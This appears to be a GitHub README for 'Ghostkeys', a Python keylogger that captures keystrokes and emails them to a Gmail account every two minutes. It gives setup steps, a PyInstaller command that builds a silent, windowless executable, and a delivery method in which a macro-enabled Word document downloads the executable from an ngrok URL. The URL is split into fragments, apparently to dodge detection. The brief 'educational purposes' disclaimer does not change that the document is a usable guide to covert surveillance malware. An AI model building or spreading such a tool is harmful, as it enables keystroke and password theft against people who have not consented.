## Ghostkeys
 
 ❗ This project is for educational purposes only. Unauthorized use on systems without consent is illegal and unethical.
 ## Features

- Keystroke logging via `pynput`
- Sends logs to a Gmail inbox every `SEND_INTERVAL` seconds
- Compiled to `.exe` using PyInstaller (`--onefile --noconsole`)
- Silent execution and optional macro-based remote delivery
- Lightweight, no file-writing unless modified

## How It Works

- A `keyboard.Listener` captures keystrokes globally.
- The captured keys are stored in a global `log` string.
- Every 120 seconds (default), the log is emailed via `smtplib`.
- After sending, the log is cleared and the timer restarts.

## Setup
Use this guide to configure and test GhostKeys using Python and optionally, remote delivery via a macro-enabled Word document.

## What you'll find
What You'll Find

| File             | Description                            |
|------------------|----------------------------------------|
| `keylogger.py`   | Main keylogger script                  |
| `downloader.vba` | VBA macro for delivery via Word        |
| `README.md`      | This documentation                     |

## 1. Install Python dependencies
- Ensure python 3.x is installed
```bash
pip install pynput
```
## 2. Configure Email settings
Open `keylogger.py` and scroll to the configuration section. Replace the placeholders:

```python
EMAIL_ADDRESS = "youremail@gmail.com"
EMAIL_PASSWORD = "your_app_password"
SEND_INTERVAL = 120  # in seconds
```
⚠️ This uses Gmail's App Passwords, not your actual password (you must have 2FA enabled).

## 3. Test the keylogger (Dev mode)
```bash
python keylogger.py
```
## 4. Compile an executable
```bash
pip install pyinstaller
python -m PyInstaller keylogger.py --onefile --noconsole
```
This generates `keylogger.exe` inside the `dist` folder

## 5. Deliver via Word macro
1. Host the executable:
   
   - Locally:
   ```bash
   python -m http.server 8080
   ```
   - Remotely:
   ```bash
    ngrok http 8080
Replace the following with your actual hosted exe link
```vb
    urlParts(0) = "https://"
    urlParts(1) = "your."
    urlParts(2) = "ngrok."
    urlParts(3) = "domain"
    urlParts(4) = "/key" & "logger.exe"
```
## About .env files
Some developers prefer using a `.env` file to store sensitive information like email credentials. This helps keep passwords separate from the main code.
If you're interested in .env for future use, you can look into the `python-dotenv` package.







  


